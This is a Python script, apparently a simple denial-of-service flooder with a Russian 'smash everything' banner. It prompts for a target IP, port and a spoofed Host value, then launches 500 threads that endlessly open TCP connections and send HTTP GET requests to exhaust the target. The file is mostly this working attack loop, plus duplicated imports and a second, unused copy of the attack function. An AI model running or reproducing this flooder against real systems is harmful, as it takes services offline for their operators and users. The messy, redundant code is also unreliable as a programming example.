import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)

import socket
import threading
import os
import time
os.system('clear')
print ("")
target = input("[+] Target IP: => ")
print("Target = ", target)
fake_ip = input("[+] Fake IP  attack : => ")
port = input ("[+] Target PORT: => ")
port_a = int(port)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
    
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

